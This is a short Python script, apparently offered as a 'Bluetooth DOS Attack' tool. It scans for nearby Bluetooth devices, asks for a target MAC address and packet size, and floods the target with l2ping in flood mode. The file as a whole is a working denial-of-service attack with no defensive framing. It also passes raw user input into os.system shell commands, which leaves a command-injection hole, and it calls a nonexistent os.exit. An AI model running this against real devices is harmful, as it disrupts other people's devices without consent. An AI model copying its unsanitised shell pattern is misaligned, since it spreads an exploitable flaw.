from threading import * 
import os
import time
def Info(target_address,size):
    command4="l2ping -i "  + bluetoothModule  +  " -s " + str(size) + " -f " + target_address
    os.system(command4)
print("Bluetooth DOS Attack ")
time.sleep(2)
print("Devloped By Karan0777 ")
time.sleep(2)
print("Enter Bluetooth Module Name ->  ")
bluetoothModule=input()
print("Starting Bluetooth Module ->")
time.sleep(1)
print("3")
time.sleep(1)
print("2")
time.sleep(1)
print("1")
time.sleep(1)
command1="hciconfig " + bluetoothModule + " up "  
os.system(command1)
time.sleep(2)
command2="hcitool scan"
os.system(command2)
print("Target Address")
target_address=input()
while (len(target_address) < 12 ):
    print ("Error Target Address Must Be Of 12 Hexadecimal Characters  MAC ADDRESS -> ")
    target_address=input()
size= input("Enter the Size Of Buffer To Be Inserted - > ")
while (len(size) <=0 ):
    print("Error ! ")
    size=int(input("Enter Buffer Size "))
try :
    Info(target_address,size)
except KeyboardInterrupt:
    os.exit()
   

